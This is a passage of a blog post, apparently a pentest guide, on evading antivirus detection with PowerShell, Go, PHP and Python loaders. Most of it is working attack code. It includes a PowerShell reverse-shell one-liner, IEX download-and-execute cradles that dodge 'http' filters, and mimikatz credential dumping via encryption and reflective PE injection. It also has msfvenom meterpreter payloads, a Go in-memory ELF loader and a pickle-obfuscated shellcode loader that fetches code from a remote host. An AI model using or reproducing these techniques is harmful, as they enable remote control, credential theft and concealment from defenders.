class="variable">$ScriptBlock</span> <span class="literal">-PassThru</span></span><br><span class="line"></span><br><span class="line">Result:</span><br><span class="line"> <span class="operator">-JOin</span> ( <span class="string">&#x27;35z32h32M32X84f104f105f115;32z102;</span></span><br><span class="line"><span class="string"> ...</span></span><br><span class="line"><span class="string"> 101z119p83f99p114-105p112M116M13h10X125&#x27;</span> <span class="operator">-SPlIT</span><span class="string">&#x27;z&#x27;</span> <span class="operator">-SpLit</span> <span class="string">&#x27;;&#x27;</span><span class="operator">-spLit</span><span class="string">&#x27;M&#x27;</span><span class="operator">-spLIT</span><span class="string">&#x27;B&#x27;</span> <span class="operator">-spLIT</span><span class="string">&#x27;h&#x27;</span> <span class="operator">-Split</span><span class="string">&#x27;-&#x27;</span> <span class="operator">-SpLIT</span> <span class="string">&#x27;s&#x27;</span><span class="operator">-split</span><span class="string">&#x27;X&#x27;</span> <span class="operator">-SpLIT</span> <span class="string">&#x27;p&#x27;</span> <span class="operator">-SPlit</span><span class="string">&#x27;f&#x27;</span>| <span class="built_in">FoReaCh-OBjECt</span> &#123; ([<span class="built_in">CHAr</span>] [<span class="built_in">INT</span>]<span class="variable">$_</span>) &#125;)| <span class="built_in">IEx</span></span><br><span class="line"></span><br><span class="line">WARNING: This command exceeds the cmd.exe maximum length of <span class="number">8190</span>.</span><br><span class="line">         Its length is <span class="number">87052</span> characters.</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span>\Encoding&gt; out <span class="number">2</span>.ps1</span><br><span class="line"></span><br><span class="line">Successfully output ObfuscatedCommand to C:\path\to\<span class="built_in">Invoke-Obfuscation</span>\<span class="number">2</span>.ps1.</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>After that the <code>2.ps1</code> is anti-AV.</p>
<p>Normally we get <code>powershell</code> reverse shell by </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;x.x.x.x&#x27;,xxxx);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream(); [byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;; <span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span>=(iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendata</span> =<span class="variable">$sendback</span>+&#x27;PS &gt;&#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendata</span>);<span class="variable">$leng</span>=<span class="variable">$sendbyte</span>.Length;<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$leng</span>);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>
<p>Listen at x.x.x.x with port xxxx will get a <code>powershell</code> which is powerful and more difficult to be monitored than <code>cmd</code></p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/the-xentropy/xencrypt#xencrypt" >Xencrypt - PowerShell crypter v 1.0<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>From the <a class="link"   target="_blank" rel="noopener" href="https://github.com/the-xentropy/xencrypt/blob/master/README.md" >README.md<i class="fas fa-external-link-alt"></i></a> it encrypts <code>mimikatz</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./xencrypt.ps1</span><br><span class="line">&gt; <span class="built_in">Invoke-Xencrypt</span> <span class="literal">-InFile</span> <span class="built_in">invoke-mimikatz</span>.ps1 <span class="literal">-OutFile</span> xenmimi.ps1</span><br></pre></td></tr></table></figure>
<p>You will now have an encrypted xenmimi.ps1 file in your current working directory. You can use it in the same way as you would the original script, so in this case:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Import-Module</span> ./xenmimi.ps1</span><br><span class="line">&gt; <span class="built_in">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure>

<p>It also supports recursive layering via the -Iterations flag.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Invoke-Xencrypt</span> <span class="literal">-InFile</span> <span class="built_in">invoke-mimikatz</span>.ps1 <span class="literal">-OutFile</span> xenmimi.ps1 <span class="literal">-Iterations</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>Warning though, the files can get big and generating the output file can take a very long time depending on the scripts and number of iterations requested.</p>
<ul>
<li>Other Ways</li>
</ul>
<p>still <code>mimikatz</code> as an example</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="literal">-exec</span> bypass <span class="string">&quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz  -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>To be living off the land</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">&quot;IEX (New-ObjectNet.WebClient).DownloadString(&#x27;http://x.x.x.x/xxx&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>Pass filters of string “http”</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">&quot;IEX (New-ObjectNet.WebClient).DownloadString((&#x27;htAtp://x.x.x.x/xxx&#x27; -replace &#x27;A&#x27;,&#x27;&#x27;));Invoke-Mimikatz -DumpCreds&quot;</span></span><br></pre></td></tr></table></figure>
<p>Not only <code>powershell</code> scripts, we can load <code>exe</code> into memory for execution using <a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" >Invoke-ReflectivePEInjection<i class="fas fa-external-link-alt"></i></a> in <a class="link"   target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit" >PowerSploit (nolonger supported)<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell.exe <span class="literal">-exec</span> bypass <span class="built_in">IEX</span> (<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString((<span class="string">&#x27;htBtp://x.x.x.x/xxx&#x27;</span> <span class="operator">-replace</span><span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));<span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEUrl</span> http://x.x.x.x/mimikatz.exe <span class="literal">-ExeArgs</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="literal">-ForceASLR</span></span><br></pre></td></tr></table></figure>



<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><blockquote>
<p>Go is an open source programming language that makes it easy to build simple, reliable, and efficient software.</p>
</blockquote>
<p>The <code>Go</code> programing language (<code>golang</code>) was published by <code>Google</code> in 2009, having great performance like <code>C</code>&#x2F;<code>C++</code> and garbage collection (GC) like <code>Java</code>, but without dependence on vm.</p>
<p>However the <code>Go</code> binaries are always not so small, with a statically linked <code>runtime</code> library, and maybe that’s why most antivirus engines on the market have relatively weak detection capabilities for them.</p>
<ul>
<li>Main Idea</li>
</ul>
<p>Since <code>Go</code> binary for now can bypass some AV softwares directly, we can inject a <code>ELF</code> shellcode in and let binary load it when running (aka. <code>Fileless</code> or <code>Living off the Land</code>).</p>
<p>Here are some tools: </p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gobuffalo/packr" >https://github.com/gobuffalo/packr<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/rakyll/statik" >https://github.com/rakyll/statik<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/GeertJohan/go.rice" >https://github.com/GeertJohan/go.rice<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/UnnoTed/fileb0x" >https://github.com/UnnoTed/fileb0x<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/mjibson/esc" >https://github.com/mjibson/esc<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/kevinburke/go-bindata" >https://github.com/kevinburke/go-bindata<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/lu4p/binclude" >https://github.com/lu4p/binclude<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/omeid/go-resources" >https://github.com/omeid/go-resources<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/pyros2097/go-embed" >https://github.com/pyros2097/go-embed<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/wlbr/mule" >https://github.com/wlbr/mule<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/miscing/embed" >https://github.com/miscing/embed<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/kyioptr/gassets" >https://github.com/kyioptr/gassets<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<hr>
<p>Here is an example.<br>We give <a class="link"   target="_blank" rel="noopener" href="https://github.com/kevinburke/go-bindata" >https://github.com/kevinburke/go-bindata<i class="fas fa-external-link-alt"></i></a> a try.<br>First generate a backdoor:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=x.x.x.x lport=xxxx -f elf &gt; ./test</span><br></pre></td></tr></table></figure>
<p>And we get result:<br><img src="/imghost/bav/1.png" alt="linux-before"><br>As this is <code>Linux</code> platform and has been encoded, so we get this number. Anyway we use <code>golang</code> to pack:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/kevinburke/go-bindata</span><br><span class="line">$ ./go-bindata ./test</span><br></pre></td></tr></table></figure>
<p>Here we’ll get a <code>bindata.go</code> in which stores data of <code>./test</code>, and now we should write a <code>main()</code> to load <code>test</code> data into memory and execute:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">const</span></span> (</span><br><span class="line">    mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// only kernel newer than 3.17 supports</span></span><br><span class="line">    memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    data, err := <span class="built_in">Asset</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="comment">// Asset was not found.</span></span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;read test file content error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    filename := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    fd, _, _ := syscall.<span class="built_in">Syscall</span>(memfdCreate, <span class="built_in">uintptr</span>(unsafe.<span class="built_in">Pointer</span>(&amp;filename)), <span class="built_in">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    _, _ = syscall.<span class="built_in">Write</span>(<span class="built_in"><span class="keyword">int</span></span>(fd), data)</span><br><span class="line">    displayName := <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">    fdPath := fmt.<span class="built_in">Sprintf</span>(<span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd)</span><br><span class="line">    _ = syscall.<span class="built_in">Exec</span>(fdPath, []string&#123;displayName&#125;, nil)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The result:<br><img src="/imghost/bav/2.png" alt="linux-after"><br>And the Windows platform, before:<br><img src="/imghost/bav/3.png" alt="win-before"><br>After:<br><img src="/imghost/bav/4.png" alt="win-after"><br>This testing project is on <a class="link"   target="_blank" rel="noopener" href="https://github.com/wonderkun/go-packer" >github<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>Like <code>Golang</code> part, converting a <code>PHP</code> reverse shell to a <code>exe</code> can also lower detection rate.</p>
<p>The <a class="link"   target="_blank" rel="noopener" href="https://sourceforge.net/projects/bamcompile/files/latest/download" >Bambalam PHP EXE Compiler<i class="fas fa-external-link-alt"></i></a> is like <code>pyinstaller</code>, packing <code>PHP</code> script to <code>exe</code>.</p>
<p>Generate php reverse shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
<p>Use Bambalam PHP EXE Compiler to process the file</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bamcompile.exe -w  -c shell.php shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><code>Python</code> is also used as a loader, always utilize <code>ctypes</code> to call <code>C</code> functions and <code>base64</code> to do obfuscation.</p>
<p>In <code>Python</code> some functions like <code>exec()</code>, <code>eval()</code>, <code>os.system()</code> and <code>subprocess.Popen()</code> are noticed always with a glance, to hind the execution we choose deserialization.</p>
<p>Example of <code>Python</code> deserialization:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gugu</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;calc.exe&#x27;</span>,),))</span><br><span class="line"></span><br><span class="line">ret = cPickle.dumps(gugu())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(ret)</span><br><span class="line">cPickle.loads(ret)</span><br></pre></td></tr></table></figure>
<p>Magic method <code>__reduce__</code> is called when an object is <code>Pickled</code>, and what it returns will be executed.<br><code>os.system()</code>, <code>subprocess.Popen()</code> and <code>eval()</code> can be choosed but, only the last <code>eval()</code>  gets rid of popping black window. However <code>eval()</code> can just run single lines.</p>
<p>Anyway here is how to generate a <code>Python</code> shellcode loader (<code>Python2</code> version):</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,cPickle,base64,urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;urllib2.urlopen(&#x27;http://x.x.x.x/xxx&#x27;).read().decode(&#x27;hex&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, shellcode</span>):</span></span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode),0x1000,0x40)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage, shellcode</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.RtlMoveMemory(rwxpage,ctypes.create_string_buffer(shellcode),len(shellcode))&quot;</span>,))</span><br><span class="line">       </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test4</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.CreateThread(0,0,rwxpage,0,0,0)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test5</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, handle</span>):</span></span><br><span class="line">            self.handle = handle</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.WaitForSingleObject(handle,-1)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    raw_shellcode = test1()</span><br><span class="line">    ser_shellcode = cPickle.dumps(raw_shellcode)</span><br><span class="line">    enb32_shellcode = base64.b32encode(ser_shellcode)</span><br><span class="line">    shellcode = cPickle.loads(base64.b32decode(enb32_shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_vir = test2(shellcode)</span><br><span class="line">    ser_vir = cPickle.dumps(raw_vir)</span><br><span class="line">    enb32_vir = base64.b32encode(ser_vir)</span><br><span class="line">    rwxpage = cPickle.loads(base64.b32decode(enb32_vir))</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    raw_rtl = test3(rwxpage, shellcode)</span><br><span class="line">    ser_rtl = cPickle.dumps(raw_rtl)</span><br><span class="line">    enb32_rtl = base64.b32encode(ser_rtl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_handle=test4(rwxpage)</span><br><span class="line">    ser_handle = cPickle.dumps(raw_handle)</span><br><span class="line">    enb32_handle = base64.b32encode(ser_handle)</span><br><span class="line">    handle = cPickle.loads(base64.b32decode(enb32_handle))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_run = test5(handle)</span><br><span class="line">    ser_run = cPickle.dumps(raw_run)</span><br><span class="line">    enb32_run = base64.b32encode(ser_run)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    output = <span class="string">&#x27;&#x27;&#x27;import ctypes,cPickle,base64,urllib2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_shellcode = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">shellcode = cPickle.loads(base64.b32decode(e_shellcode))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_rwxpage=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">rwxpage = cPickle.loads(base64.b32decode(e_rwxpage))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_code = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_code))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_handle = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">handle = cPickle.loads(base64.b32decode(e_handle))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_run = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_run))&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(enb32_shellcode, enb32_vir, enb32_rtl, enb32_handle, enb32_run)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Loader.py&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(output)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<p>Then we get a <code>Loader.py</code> and use <code>pyinstaller</code> to pack it.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ PyInstaller --noconsole --onefile Loader.py</span><br></pre></td></tr></table></figure>



        </div>

        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/linux/">#linux</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/windows/">#windows</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/pentest/">#pentest</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Binary-Code-Similarity-Detection-Papers</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/07/31/2021-07-31-Handle-Pwn-Libc-and-Host-a-Pwn/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Handle Pwn Libc and Host a Pwn</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
        </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#General"><span class="nav-number">1.</span> <span class="nav-text">General</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-number">1.1.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Veil"><span class="nav-number">1.2.</span> <span class="nav-text">Veil</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#charlotte"><span class="nav-number">1.3.</span> <span class="nav-text">charlotte</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#White-list"><span class="nav-number">2.</span> <span class="nav-text">White list</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#forfiles"><span class="nav-number">2.1.</span> <span class="nav-text">forfiles</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pcalua"><span class="nav-number">2.2.</span> <span class="nav-text">pcalua</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SyncAppvPublishingServer"><span class="nav-number">2.3.</span> <span class="nav-text">SyncAppvPublishingServer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cmd-Hijack"><span class="nav-number">2.4.</span> <span class="nav-text">Cmd Hijack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#conhost-exe"><span class="nav-number">2.5.</span> <span class="nav-text">conhost.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#explorer-exe"><span class="nav-number">2.6.</span> <span class="nav-text">explorer.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#waitfor"><span class="nav-number">2.7.</span> <span class="nav-text">waitfor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#InstallUtil-exe"><span class="nav-number">2.8.</span> <span class="nav-text">InstallUtil.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 